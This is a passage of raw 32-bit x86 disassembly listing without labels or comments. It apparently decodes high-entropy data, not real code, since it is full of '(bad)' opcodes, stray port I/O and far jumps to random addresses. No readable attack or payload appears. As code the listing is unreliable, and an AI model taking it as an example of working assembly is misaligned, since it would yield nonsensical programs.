  41fe2f:	mov    cl,0xde
  41fe31:	ret    
  41fe32:	mov    ch,cl
  41fe34:	inc    eax
  41fe35:	xor    DWORD PTR ss:[ebp-0x11aa88d1],esi
  41fe3c:	or     eax,0xc0a7aa84
  41fe41:	inc    ebx
  41fe42:	mov    ds:0xc447f210,eax
  41fe47:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe48:	repnz push edx
  41fe4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe4b:	jge    0x41fec9
  41fe4d:	je     0x41feba
  41fe4f:	sti    
  41fe50:	push   esp
  41fe51:	jp     0x41fe90
  41fe53:	dec    ecx
  41fe54:	rcl    DWORD PTR [esi],0xda
  41fe57:	test   BYTE PTR [ebx+0x76f29e5a],0xe4
  41fe5e:	adc    edi,edx
  41fe60:	(bad)  
  41fe61:	xchg   esp,eax
  41fe62:	sub    DWORD PTR [edi+0x722a5ef5],ecx
  41fe68:	jmp    0xd3af817
  41fe6d:	je     0x41fe71
  41fe6f:	xchg   BYTE PTR [ebp*2+0x607a7682],cl
  41fe76:	mov    al,ds:0x25141ee7
  41fe7b:	sub    eax,0xfb8fe6b2
  41fe80:	ret    
  41fe81:	jo     0x41feaf
  41fe83:	mov    esp,0xcc902029
  41fe88:	jecxz  0x41fe7a
  41fe8a:	jo     0x41fe24
  41fe8c:	mov    ?,ecx
  41fe8e:	test   BYTE PTR es:[ebx+0x49db22f8],bl
  41fe95:	and    BYTE PTR [eax+edx*8-0x613fdb33],al
  41fe9c:	test   eax,0x33db2cf3
  41fea1:	dec    esi
  41fea2:	enter  0xf6aa,0x59
  41fea6:	in     eax,dx
  41fea7:	or     ch,BYTE PTR ds:0xec491af0
  41fead:	pop    ds
  41feae:	xchg   ecx,eax
  41feaf:	lahf   
  41feb0:	dec    edi
  41feb1:	out    0x56,eax
  41feb3:	stos   BYTE PTR es:[edi],al
  41feb4:	push   es
  41feb5:	mov    bh,BYTE PTR [ebx]
  41feb7:	jecxz  0x41fe5e
  41feb9:	sub    eax,0xf43b3705
  41febe:	psrlw  mm3,mm6
  41fec1:	adc    BYTE PTR [ebx],0x58
  41fec4:	sub    cl,al
  41fec6:	sbb    DWORD PTR [edx+0x44],edx
  41fec9:	ins    DWORD PTR es:[edi],dx
  41feca:	mov    al,ds:0xe41cd6dc
  41fecf:	fwait
  41fed0:	pop    edi
  41fed1:	rcl    DWORD PTR [ebx+edx*4],1
  41fed4:	jbe    0x41fede
  41fed6:	jecxz  0x41ff49
  41fed8:	jge    0x41fe90
  41feda:	fsub   st,st(2)
  41fedc:	dec    ebx
  41fedd:	add    dl,al
  41fedf:	cmp    DWORD PTR [ebx+0x5618c327],0xffffffce
  41fee6:	stos   BYTE PTR es:[edi],al
  41fee7:	into   
  41fee8:	rol    edx,0xf4
  41feeb:	fwait
  41feec:	pusha  
  41feed:	pop    eax
  41feee:	jmp    0x41ff49
  41fef0:	inc    edi
  41fef1:	mov    esi,0xb8e92088
  41fef6:	loopne 0x41ff39
  41fef8:	pop    edi
  41fef9:	pop    ebp
  41fefa:	sbb    al,0x5a
  41fefc:	call   0x1cab:0xff786764
  41ff03:	xchg   ecx,eax
  41ff04:	into   
  41ff05:	xchg   ebx,eax
  41ff06:	pop    ds
  41ff07:	inc    ebp
  41ff08:	mov    edx,0x18f80823
  41ff0d:	scas   al,BYTE PTR es:[edi]
  41ff0e:	je     0x41ff6b
  41ff10:	lods   al,BYTE PTR ds:[esi]
  41ff11:	fdivp  st(4),st
  41ff13:	add    DWORD PTR [edi+ecx*1],ecx
  41ff16:	ins    BYTE PTR es:[edi],dx
  41ff17:	adc    DWORD PTR [edi],edi
  41ff19:	adc    ch,BYTE PTR [edx-0x6ef82e2]
  41ff1f:	loope  0x41fef5
  41ff21:	into   
  41ff22:	outs   dx,DWORD PTR ds:[esi]
  41ff23:	add    ebx,esi
  41ff25:	mov    ds:0xef999ebe,eax
  41ff2a:	mov    cl,0x0
  41ff2c:	pop    ds
  41ff2d:	int3   
  41ff2e:	lods   al,BYTE PTR ds:[esi]
  41ff2f:	and    ah,0xf1
  41ff32:	sbb    al,0x9d
  41ff34:	dec    esp
  41ff35:	inc    ebp
  41ff36:	mov    ah,0x99
  41ff38:	cmp    dl,ch
  41ff3a:	add    DWORD PTR [edx],eax
  41ff3c:	repnz mul BYTE PTR [esi-0x64]
  41ff40:	call   0x2aaf368a
  41ff45:	icebp  
  41ff46:	mov    ebx,0x8b44ea13
  41ff4b:	sbb    dl,BYTE PTR [edx-0x4c0ed5f7]
  41ff51:	fwait
  41ff52:	shr    BYTE PTR [ebx],1
  41ff54:	ret    
  41ff55:	and    BYTE PTR [esp+eax*1+0x17f23ca8],0xe7
  41ff5d:	xchg   ebx,eax
  41ff5e:	fmul   st(5),st
  41ff60:	bound  edi,QWORD PTR ds:0x5669608e
  41ff66:	cld    
  41ff67:	sub    al,0x5a
  41ff69:	cs pop esp
  41ff6b:	rcr    ebx,cl
  41ff6d:	loopne 0x41feef
  41ff6f:	(bad)  
  41ff70:	test   eax,0x89613e37
  41ff75:	cmp    eax,0x778234c
  41ff7a:	cmp    al,0x81
  41ff7c:	mov    bl,0x59
  41ff7e:	adc    al,0x21
  41ff80:	cdq    
  41ff81:	sub    BYTE PTR [edx-0x7ff96896],cl
  41ff87:	rcl    DWORD PTR [ebx-0x2],0x71
  41ff8b:	or     cl,BYTE PTR ds:0xcb05d058
  41ff91:	leave  
  41ff92:	outs   dx,DWORD PTR ds:[esi]
  41ff93:	call   0xed1f0dd
  41ff98:	lahf   
  41ff99:	mov    esi,0x7237dfc
  41ff9e:	cld    
  41ff9f:	or     DWORD PTR [ebp+0x5f89eba4],ebx
  41ffa5:	ins    DWORD PTR es:[edi],dx
  41ffa6:	test   DWORD PTR [ebx],esp
  41ffa8:	mov    dl,0xb2
  41ffaa:	daa    
  41ffab:	and    esi,eax
  41ffad:	pop    esp
  41ffae:	inc    edx
  41ffaf:	clc    
  41ffb0:	or     al,0x35
  41ffb2:	ss mov eax,0x8e0d24ed
  41ffb8:	xlat   BYTE PTR ds:[ebx]
  41ffb9:	in     eax,dx
  41ffba:	mov    ecx,0x2575417b
  41ffbf:	jl     0x42001b
  41ffc1:	adc    bl,al
  41ffc3:	out    0xad,eax
  41ffc5:	push   eax
  41ffc6:	or     al,0x60
  41ffc8:	mov    esp,0xd9f79bf9
  41ffcd:	popa   
  41ffce:	repnz mov esi,0xa4117fb5
  41ffd4:	adc    BYTE PTR [edx+ebx*8-0x1219fc4d],0x31
  41ffdc:	ds dec ecx
  41ffde:	and    BYTE PTR [eax+0x50790947],dh
  41ffe4:	aas    
  41ffe5:	pop    ecx
  41ffe6:	cmp    DWORD PTR [esi-0x5d],ebp
  41ffe9:	call   0x2a1982ac
  41ffee:	jp     0x420010
  41fff0:	je     0x420058
  41fff2:	mov    WORD PTR [esi+0x49],cs
  41fff5:	push   ds
  41fff6:	or     al,0xf0
  41fff8:	loopne 0x420065
  41fffa:	xlat   BYTE PTR ds:[ebx]
  41fffb:	int3   
  41fffc:	and    dh,dh
  41fffe:	aaa    
  41ffff:	imul   ebp,DWORD PTR [ecx+ebp*8+0x9],0x47a15650
  420007:	aad    0xc3
  420009:	or     BYTE PTR [edx+0x66a1cf32],0x76
  420010:	loop   0x420091
  420012:	jle    0x420047
  420014:	sti    
  420015:	pop    esp
  420016:	dec    ebx
  420017:	jbe    0x41ffab
  420019:	inc    edx
  42001a:	test   DWORD PTR [esi+ecx*1],edi
  42001d:	push   es
  42001e:	push   ebx
  42001f:	xor    al,0xd5
  420021:	inc    ecx
  420022:	jmp    0x9d1f03d8
  420027:	inc    eax
  420028:	call   0xf57e:0xb0071f60
  42002f:	sub    al,BYTE PTR [di]
  420032:	scas   al,BYTE PTR es:[edi]
  420033:	mov    edi,0x7d38a45e
  420038:	cmp    al,0xbc
  42003a:	mov    al,ds:0xb83e40ee
  42003f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420040:	in     eax,0xfc
  420042:	dec    edx
  420043:	pop    ss
  420044:	ins    BYTE PTR es:[edi],dx
  420045:	jmp    0x816c0722
  42004a:	in     eax,0x41
  42004c:	sub    ebp,0x2b90c255
  420052:	daa    
  420053:	and    esi,ecx
  420055:	call   0x54ff:0x2591835c
  42005c:	sti    
  42005d:	sar    BYTE PTR [ebx+0x3a],cl
  420060:	repnz rcr DWORD PTR [ebp+0x61],cl
  420064:	jne    0x42004a
  420066:	xor    eax,esi
  420068:	iret   
  420069:	cmp    ebx,DWORD PTR [ecx]
  42006b:	popf   
  42006c:	ficom  WORD PTR [eax+ebx*1+0x6a]
  420070:	xor    DWORD PTR [edx],esi
  420072:	xlat   BYTE PTR ds:[ebx]
  420073:	mov    eax,ds:0xa2a9399e
  420078:	js     0x420026
  42007a:	xchg   esi,eax
  42007b:	mov    eax,ds:0x2c136c86
  420080:	add    BYTE PTR ds:[ebp-0x7a],ch
  420084:	data16 mov al,BYTE PTR [esi+0xc125913]
  42008b:	popa   
  42008c:	dec    ebx
  42008d:	push   ecx
  42008e:	xor    al,0x5e
  420090:	imul   ebx,esp,0x20
  420093:	pop    ss
  420094:	fwait
  420095:	or     cl,BYTE PTR [ebx-0x57701ccf]
  42009b:	lahf   
  42009c:	or     eax,0x69e5ce5f
  4200a1:	add    ah,bh
  4200a3:	xor    al,0x33
  4200a5:	popa   
  4200a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4200a7:	mov    ebx,DWORD PTR [ecx-0x7a]
  4200aa:	fmul   st,st(0)
  4200ac:	pop    ecx
  4200ad:	jno    0x4200c6
  4200af:	hlt    
  4200b0:	pop    eax
  4200b1:	mov    edi,0x3d03dc74
  4200b6:	js     0x420095
  4200b8:	pushf  
  4200b9:	cmc    
  4200ba:	pop    ecx
  4200bb:	scas   eax,DWORD PTR es:[edi]
  4200bc:	mov    bh,0xfa
  4200be:	dec    esp
  4200bf:	pop    edx
  4200c0:	mul    BYTE PTR [edi+0x2d]
  4200c3:	repz dec ecx
  4200c5:	arpl   WORD PTR cs:[edx+0x77],cx
  4200c9:	mov    edx,0xc79b9671
  4200ce:	mov    al,BYTE PTR [ebx+0x5e]
  4200d1:	sub    al,dl
  4200d3:	pop    edx
  4200d4:	in     al,dx
  4200d5:	push   ds
  4200d6:	or     BYTE PTR [edi],bh
  4200d8:	sti    
  4200d9:	leave  
  4200da:	cmp    eax,0xa14d15ce
  4200df:	pushf  
  4200e0:	call   0xde53:0xb33bf688
  4200e7:	stos   BYTE PTR es:[edi],al
  4200e8:	add    edx,DWORD PTR [edi+0x7dd77ae9]
  4200ee:	add    eax,0xe16127fd
  4200f3:	ror    BYTE PTR [ebx],1
  4200f5:	xchg   DWORD PTR [ebx-0x570f4d31],esi
  4200fb:	es addr16 push edx
  4200fe:	cli    
  4200ff:	mov    eax,0xdbb2eaf8
  420104:	cwde   
  420105:	sar    DWORD PTR [edi+edi*4+0x1cf2540],cl
  42010c:	or     eax,DWORD PTR [ebx]
  42010e:	shl    edx,0x7
  420111:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420112:	(bad)  [eax]
  420114:	fwait
  420115:	scas   al,BYTE PTR es:[edi]
  420116:	and    al,0xa4
  420118:	js     0x4200fa
  42011a:	icebp  
  42011b:	fdivr  st(7),st
  42011d:	shl    DWORD PTR ds:0x98c316a,0x3b
  420124:	mov    edx,0xafa8abb4
  420129:	xchg   edx,eax
  42012a:	and    BYTE PTR [ebx],al
  42012c:	in     al,dx
  42012d:	sub    BYTE PTR [edx],dl
  42012f:	mul    bh
  420131:	add    DWORD PTR [edx-0xa],0x82d0c7b4
  420138:	adc    BYTE PTR [ecx-0xf],bh
  42013b:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  42013d:	fwait
  42013e:	pushf  
  42013f:	jb     0x4200ea
  420141:	mov    ecx,0x7e241e5a
  420146:	or     BYTE PTR [edx],cl
  420148:	or     bl,BYTE PTR [edi+0x5963103]
  42014e:	icebp  
  42014f:	push   edi
  420150:	or     cl,BYTE PTR [esi-0x26a494b1]
  420156:	inc    ebp
  420157:	nop
  420158:	in     al,dx
  420159:	xchg   esp,eax
  42015a:	addr16 js 0x4201a8
  42015d:	mov    al,ds:0xd0083830
  420162:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420163:	adc    al,0x18
  420165:	loope  0x4201a3
  420167:	push   esp
  420168:	push   ds
  420169:	aad    0x7c
  42016b:	mov    dh,0xa7
  42016d:	ins    BYTE PTR es:[edi],dx
  42016e:	mov    bl,0x5a
  420170:	mov    ebx,0x3c5fa551
  420175:	dec    edx
  420176:	add    DWORD PTR [ebx],edx
  420178:	pusha  
  420179:	pop    ecx
  42017a:	dec    edi
  42017b:	icebp  
  42017c:	add    eax,0xc07794a6
  420181:	pop    ebx
  420182:	test   BYTE PTR [edx],dh
  420184:	xchg   esp,eax
  420185:	add    BYTE PTR [edx+edi*8+0x37],bh
  420189:	inc    ebp
  42018a:	adc    eax,0xdead4c06
  42018f:	sar    DWORD PTR [edi+ebp*4-0x57],cl
  420193:	lock pop eax
  420195:	pop    edx
  420196:	test   al,0x81
  420198:	mov    ds:0x6abcdb7e,al
  42019d:	sub    ah,cl
  42019f:	mov    ch,dl
  4201a1:	loop   0x4201b7
  4201a3:	stos   DWORD PTR es:[edi],eax
  4201a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4201a5:	jne    0x42017a
  4201a7:	cmp    DWORD PTR [edx-0x16],0xffffffcf
  4201ab:	(bad)  [edx-0x1bb0c30e]
  4201b1:	adc    eax,0x4c56c3a0
  4201b6:	add    DWORD PTR [edi],0xffffff95
  4201b9:	cs xchg esi,eax
  4201bb:	and    DWORD PTR [edi+0x76ec0ff6],eax
  4201c1:	fimul  WORD PTR [eax+0x40]
  4201c4:	mov    esi,0xb8d69781
  4201c9:	sub    eax,DWORD PTR [ebp+0x76]
  4201cc:	in     eax,0xe5
  4201ce:	dec    ebx
  4201cf:	add    al,0x10
  4201d1:	fnstsw WORD PTR [edi-0x1]
  4201d4:	lahf   
  4201d5:	das    
  4201d6:	mov    esp,?
  4201d8:	pop    es
  4201d9:	jl     0x420197
  4201db:	sar    DWORD PTR [eax+0x6],0x93
  4201df:	mov    bh,0x79
  4201e1:	call   0x8968:0xd462c456
  4201e8:	pop    esp
  4201e9:	push   esp
  4201ea:	mov    al,ds:0x2c2ec228
  4201ef:	scas   al,BYTE PTR es:[edi]
  4201f0:	mov    edx,0x38bcf09
  4201f5:	xchg   ebp,eax
  4201f6:	pusha  
  4201f7:	or     al,0xb4
  4201f9:	xchg   edi,eax
  4201fa:	sub    bl,ah
  4201fc:	aam    0x55
  4201fe:	or     eax,0x4c25f92
  420203:	ins    BYTE PTR es:[edi],dx
  420204:	and    DWORD PTR [esi+0x6],esp
  420207:	add    BYTE PTR [edi-0x24],ch
  42020a:	dec    edx
  42020b:	mov    DWORD PTR [eax],eax
  42020d:	jbe    0x42024e
  42020f:	test   BYTE PTR [edi+esi*2+0x66],0xc3
  420214:	hlt    
  420215:	in     eax,0x36
  420217:	mov    ds:0x8daa05db,eax
  42021c:	leave  
  42021d:	mov    ecx,0xe570a1a4
  420222:	(bad)  
  420223:	loope  0x420204
  420225:	jmp    0x4201df
  420227:	xlat   BYTE PTR ds:[ebx]
  420228:	call   0x153028bd
  42022d:	mov    al,0xc3
  42022f:	out    dx,eax
  420230:	cld    
  420231:	mov    dh,0x46
  420233:	fld    TBYTE PTR ds:0xdd54d165
  420239:	cwde   
  42023a:	stc    
  42023b:	pushf  
  42023c:	sub    bl,al
  42023e:	add    eax,0x2d19402d
  420243:	inc    ebp
  420244:	add    al,0xc9
  420246:	dec    eax
  420247:	cmp    al,0x85
  420249:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42024a:	or     al,0x3c
  42024c:	sbb    al,0x32
  42024e:	cli    
  42024f:	bound  eax,QWORD PTR [ebx+0x41]
  420252:	ss adc edi,0x52e72108
  420259:	stc    
  42025a:	jl     0x4201fd
  42025c:	push   esi
  42025d:	sub    al,0xe0
  42025f:	stos   BYTE PTR es:[edi],al
  420260:	sub    bh,BYTE PTR [ebx]
  420262:	sar    ah,0x58
  420265:	jae    0x4202bc
  420267:	mov    ecx,DWORD PTR [ebx-0x48]
  42026a:	ror    ah,0x2b
  42026d:	mov    bh,0x39
  42026f:	stos   DWORD PTR es:[edi],eax
  420270:	enter  0x7b7d,0x11
  420274:	xchg   ecx,eax
  420275:	out    0x69,eax
  420277:	imul   edx,DWORD PTR [eax],0xffffffef
  42027a:	(bad)  
  42027b:	ffree  st(4)
  42027d:	jmp    0xe29e034
  420282:	and    al,0xf1
  420284:	jnp    0x420223
  420286:	mov    ah,0xf7
  420288:	shl    BYTE PTR [edx-0x6b680663],0x2d
  42028f:	imul   eax,DWORD PTR [eax-0x42712d61],0x14d7dc1d
  420299:	add    al,0x64
  42029b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42029c:	(bad)  
  42029d:	stc    
  42029e:	xor    eax,0xd6b38a8e
  4202a3:	das    
  4202a4:	(bad)  
  4202a5:	pop    ebx
  4202a6:	or     eax,0xdc77f306
  4202ab:	aaa    
  4202ac:	jecxz  0x42027b
  4202ae:	fild   DWORD PTR [edx]
  4202b0:	outs   dx,BYTE PTR ds:[esi]
  4202b1:	(bad)  
  4202b2:	mov    al,0x2b
  4202b4:	or     BYTE PTR [edi-0x170746f2],0x92
  4202bb:	fisubr DWORD PTR [esi+0x5ec39bcb]
  4202c1:	in     eax,dx
  4202c2:	mov    ebp,0x6c3225b3
  4202c7:	retf   
  4202c8:	call   0xccf43145
  4202cd:	(bad)  
  4202ce:	cli    
  4202cf:	std    
  4202d0:	pop    ebp
  4202d1:	aam    0xe4
  4202d3:	shl    BYTE PTR [ecx],cl
  4202d5:	ins    DWORD PTR es:[edi],dx
  4202d6:	(bad)  
  4202d8:	ret    
  4202d9:	(bad)  
  4202da:	int3   
  4202db:	pop    esi
  4202dc:	outs   dx,DWORD PTR ds:[esi]
  4202dd:	add    edi,DWORD PTR [edi+0x246d66d4]
  4202e3:	cld    
  4202e4:	out    0x55,al
  4202e6:	mov    ds:0x22ec5a65,al
  4202eb:	(bad)  
  4202ec:	int3   
  4202ed:	retf   0x55b0
  4202f0:	mov    cl,0x94
  4202f2:	xchg   ebx,eax
  4202f3:	xor    ch,dh
  4202f5:	ins    DWORD PTR es:[edi],dx
  4202f6:	cmc    
  4202f7:	dec    ecx
  4202f8:	cmp    ecx,DWORD PTR [edx]
  4202fa:	lahf   
  4202fb:	pop    eax
  4202fc:	das    
  4202fd:	push   cs
  4202fe:	sub    al,0x8
  420300:	repnz mov dl,0x9
  420303:	sub    eax,0x7e6d1c2e
  420308:	mov    ecx,eax
  42030a:	std    
  42030b:	int    0xe2
  42030d:	repnz mov al,ds:0x3a6fcc24
  420313:	sahf   
  420314:	mov    BYTE PTR [edx-0x2b],bh
  420317:	sbb    BYTE PTR [ecx+0x5f],bl
  42031a:	idiv   DWORD PTR [eax]
  42031c:	shl    DWORD PTR [ecx+0x3a22ec78],cl
  420322:	inc    edi
  420323:	xchg   esi,eax
  420324:	ins    BYTE PTR es:[edi],dx
  420325:	retf   0x62a5
  420328:	xchg   ecx,eax
  420329:	push   ss
  42032a:	or     cl,BYTE PTR [edi-0x45dc3f95]
  420330:	(bad)  
  420331:	jae    0x420307
  420333:	mov    dh,0x3c
  420335:	mov    bh,0x55
  420337:	cmp    dh,BYTE PTR [eax]
  420339:	jmp    0x42033f
  42033b:	mov    ch,bl
  42033d:	repnz sub edx,edx
  420340:	dec    esp
  420341:	rol    BYTE PTR [ebp+0x7f225939],cl
  420347:	rol    DWORD PTR [edx+ebx*8+0x69],cl
  42034b:	mov    ds:0x9e93bd09,eax
  420350:	aam    0xe8
  420352:	xchg   DWORD PTR [eax+0x18],ebp
  420355:	test   BYTE PTR [ecx+0x3c],dh
  420358:	lahf   
  420359:	outs   dx,DWORD PTR ds:[esi]
  42035a:	pop    ss
  42035b:	inc    esp
  42035c:	and    al,0x26
  42035e:	mov    edi,0x5ccddd91
  420363:	idiv   cl
  420365:	add    ebp,DWORD PTR [ecx-0x9d12846]
  42036b:	xchg   esp,eax
  42036c:	dec    ecx
  42036d:	or     cl,bh
  42036f:	add    eax,0x27372f78
  420374:	inc    ebp
  420375:	mov    dh,dh
  420377:	rol    DWORD PTR [edi+0x46],cl
  42037a:	ss push edx
  42037c:	add    al,ah
  42037e:	mov    esi,0xdfa30738
  420383:	sub    bl,BYTE PTR [eax]
  420385:	mov    ebx,0x34e86356
  42038a:	fidivr DWORD PTR [ebx-0x7c]
  42038d:	mov    edi,0x12378894
  420392:	pop    ss
  420393:	inc    ebx
  420394:	or     edi,edx
  420396:	ja     0x4203e5
  420398:	jmp    0x42037d
  42039a:	jl     0x42034c
  42039c:	mov    ah,BYTE PTR [esi]
  42039e:	(bad)  
  42039f:	cwde   
  4203a0:	jnp    0x4203b6
  4203a2:	(bad)  
  4203a3:	loop   0x4203e0
  4203a5:	push   ss
  4203a6:	ins    DWORD PTR es:[edi],dx
  4203a7:	shl    DWORD PTR [esi+0xc159bc2],cl
  4203ad:	aam    0xdc
  4203af:	and    al,BYTE PTR [esi]
  4203b1:	out    0x6,al
  4203b3:	loopne 0x4203a8
  4203b5:	leave  
  4203b6:	cmp    ebx,esi
  4203b8:	js     0x42039e
  4203ba:	push   ss
  4203bb:	sub    ecx,DWORD PTR [esi]
  4203bd:	aaa    
  4203be:	push   es
  4203bf:	test   eax,0x342387bf
  4203c4:	sub    esp,ebp
  4203c6:	mov    esi,0xd998d129
  4203cb:	rcr    edx,1
  4203cd:	mov    dh,0x38
  4203cf:	repz jbe 0x420441
  4203d2:	dec    eax
  4203d3:	inc    ecx
  4203d4:	inc    edx
  4203d5:	aaa    
  4203d6:	stos   DWORD PTR es:[edi],eax
  4203d7:	cmc    
  4203d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203d9:	lods   eax,DWORD PTR ds:[esi]
  4203da:	pop    DWORD PTR [eax-0x21b081a]
  4203e0:	jmp    0x8cbf:0x9a6e85d
  4203e7:	sbb    BYTE PTR [ebp-0x150414b7],cl
  4203ed:	mov    cl,0xf6
  4203ef:	mov    esi,0xc2235907
  4203f4:	xchg   esp,eax
  4203f5:	stos   DWORD PTR es:[edi],eax
  4203f6:	lahf   
  4203f7:	ss mov eax,0x180dd91c
  4203fd:	bnd jp 0x4203d5
  420400:	and    DWORD PTR ds:0x416f209b,edx
  420406:	add    edi,DWORD PTR [ecx-0x39676c8d]
  42040c:	std    
  42040d:	or     al,0x4
  42040f:	inc    edi
  420410:	mov    ah,0x2b
  420412:	adc    DWORD PTR [ecx-0x14],0xffffffc7
  420416:	and    DWORD PTR [edx+ecx*8-0x8],edx
  42041a:	jno    0x42042c
  42041c:	or     eax,0x6e426
  420421:	xor    edi,DWORD PTR [ebx-0x6ca4c818]
  420427:	lahf   
  420428:	aas    
  420429:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42042a:	(bad)  
  42042b:	cmp    eax,esi
  42042d:	es aam 0x71
  420430:	fs push eax
  420432:	jge    0x420483
  420434:	cmp    al,0xa7
  420436:	pop    ss
  420437:	mov    eax,ds:0x95d89dcc
  42043c:	scas   eax,DWORD PTR es:[edi]
  42043d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42043f:	int3   
  420440:	dec    esp
  420441:	pop    edx
  420442:	lahf   
  420443:	mov    esi,DWORD PTR [ecx+0x60c16967]
  420449:	pop    es
  42044a:	pop    esi
  42044b:	(bad)
  42044f:	loop   0x420424
  420451:	xchg   esp,eax
  420452:	xchg   DWORD PTR [ebx+0x63],esi
  420455:	sbb    BYTE PTR [ecx],ah
  420457:	jp     0x420458
  420459:	sbb    dl,BYTE PTR [ebp-0x6]
  42045c:	iret   
  42045d:	pop    ds
  42045e:	xchg   edx,eax
  42045f:	push   edi
  420460:	mov    ds:0x4f42ff44,al
  420465:	(bad)  
  420466:	xor    cl,dl
  420468:	cs fwait
  42046a:	mov    WORD PTR [esi+0x11],gs
  42046d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42046e:	mov    ah,0xc6
  420470:	nop
  420471:	cwde   
  420472:	ins    BYTE PTR es:[edi],dx
  420473:	imul   ch
  420475:	mov    dh,0xc8
  420477:	pop    esi
  420478:	cmp    ecx,ebp
  42047a:	jle    0x420425
  42047c:	sbb    DWORD PTR [ecx+0x334a6a04],ebx
  420482:	sbb    eax,0xf8efcd1b
  420487:	xchg   ecx,eax
  420488:	jge    0x42047e
  42048a:	pop    esi
  42048b:	pop    esi
  42048c:	test   BYTE PTR [ebx-0x7647b87d],dh
  420492:	mov    al,0x15
  420494:	je     0x420496
  420496:	daa    
  420497:	and    al,0xd7
  420499:	push   eax
  42049a:	or     al,0x8b
  42049c:	repz dec edi
  42049e:	pop    ss
  42049f:	xlat   BYTE PTR ds:[ebx]
  4204a0:	inc    ecx
  4204a1:	imul   edi,DWORD PTR [ebp-0x6c],0xffffffe9
  4204a5:	aaa    
  4204a6:	mov    bl,0x5a
  4204a8:	push   ebx
  4204a9:	xchg   ebx,eax
  4204aa:	jno    0x42050c
  4204ac:	aad    0xef
  4204ae:	xor    ch,BYTE PTR [esi-0x31]
  4204b1:	les    edx,FWORD PTR [eax+0x18]
  4204b4:	mov    ds:0x9419a9aa,eax
  4204b9:	retf   0xd53b
  4204bc:	cmp    ah,al
  4204be:	cld    
  4204bf:	test   DWORD PTR [edx+0x49],edx
  4204c2:	jmp    0x42051b
  4204c4:	mov    bh,0xda
  4204c6:	xchg   ecx,eax
  4204c7:	jmp    0x75fc:0x6c221bfb
  4204ce:	mov    bh,0x3f
  4204d0:	mov    DWORD PTR [ecx],edx
  4204d2:	and    eax,0x9814c478
  4204d7:	dec    edi
  4204d8:	sahf   
  4204d9:	dec    edi
  4204da:	push   ebp
  4204db:	ins    DWORD PTR es:[edi],dx
  4204dc:	data16 jo 0x4204b6
  4204df:	xchg   DWORD PTR [ebx],edi
  4204e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204e2:	bound  edx,QWORD PTR [eax]
  4204e4:	dec    ebp
  4204e5:	push   esi
  4204e6:	call   0x2687a2c1
  4204eb:	fistp  WORD PTR [ecx]
  4204ed:	stc    
  4204ee:	add    al,0x71
  4204f0:	loop   0x420555
  4204f2:	pushf  
  4204f3:	or     BYTE PTR [ebp-0x80],ch
  4204f6:	mov    dh,0x72
  4204f8:	pop    ebx
  4204f9:	mov    edx,0x670366d
  4204fe:	sub    BYTE PTR [ebp+0x50],bl
  420501:	fs popf 
  420503:	inc    ebx
  420504:	add    BYTE PTR [edi-0x3e6e5c6b],al
  42050a:	add    bh,BYTE PTR [eax+0x5f]
  42050d:	mov    eax,ds:0x7555eafd
  420512:	mov    bl,0xbb
  420514:	iret   
  420515:	aam    0x2e
  420517:	lock jge 0x420513
  42051a:	enter  0x9f66,0x12
  42051e:	cld    
  42051f:	addr16 jo 0x4204d4
  420522:	sub    eax,0xae6b90b
  420527:	adc    esi,edi
  420529:	push   ds
  42052a:	call   0xb3c24800
  42052f:	and    al,0x67
  420531:	ins    DWORD PTR es:[edi],dx
  420532:	pushf  
  420533:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420534:	(bad)  
  420535:	jae    0x42051d
  420537:	cmp    DWORD PTR [esi+0x4cbf92f4],0x14
  42053e:	mov    esi,esi
  420540:	fucomp st(3)
  420542:	pop    ebx
  420543:	shl    DWORD PTR [ebp+0xbf40797],1
  420549:	adc    ah,bh
  42054b:	or     al,0xf
  42054d:	jmp    0xe3d98242
  420552:	jb     0x42058d
  420554:	add    bh,BYTE PTR [ebx-0x22]
  420557:	ds ret 
  420559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42055a:	mov    esp,0x68ae3b40
  42055f:	in     al,0x5b
  420561:	ret    
  420562:	cmp    esp,DWORD PTR [eax-0x14]
  420565:	sbb    ebx,DWORD PTR [eax+0x54]
  420568:	or     esi,DWORD PTR [ebx]
  42056a:	xchg   ebp,eax
  42056b:	aam    0x97
  42056d:	add    al,BYTE PTR [ecx]
  42056f:	enter  0x6dc2,0xfd
  420573:	mov    DWORD PTR [ebx+0x55c4058e],edx
  420579:	sub    dl,BYTE PTR [esi+0x70a83d84]
  42057f:	mov    dl,0x4e
  420581:	pusha  
  420582:	or     eax,edx
  420584:	retf   
  420585:	lods   al,BYTE PTR ds:[esi]
  420586:	out    0x6a,eax
  420588:	sub    eax,0xe18f0854
  42058d:	pop    esp
  42058e:	gs daa 
  420590:	push   ecx
  420591:	clc    
  420592:	xlat   BYTE PTR ds:[ebx]
  420593:	add    eax,0x2d7ae3c
  420598:	push   es
  420599:	cmp    esi,DWORD PTR [edx+0x5401bab]
  42059f:	test   BYTE PTR [esi+edi*1],ah
  4205a2:	or     al,0x9a
  4205a4:	and    al,0x8
  4205a6:	outs   dx,BYTE PTR ds:[esi]
  4205a7:	pop    eax
  4205a8:	lea    eax,[edi-0x76953fa7]
  4205ae:	add    DWORD PTR [esi-0x7],eax
  4205b1:	mov    edi,0xce945ea1
  4205b6:	pop    edi
  4205b7:	sub    ebx,DWORD PTR [esi-0x2d]
  4205ba:	cmp    bh,BYTE PTR ds:0x6008905e
  4205c0:	jno    0x4205db
  4205c2:	pop    edx
  4205c3:	inc    edx
  4205c4:	imul   BYTE PTR [eax+0x9]
  4205c7:	lods   al,BYTE PTR ds:[esi]
  4205c8:	fld    TBYTE PTR [edi]
  4205ca:	repz pop es
  4205cc:	mov    cl,0xd0
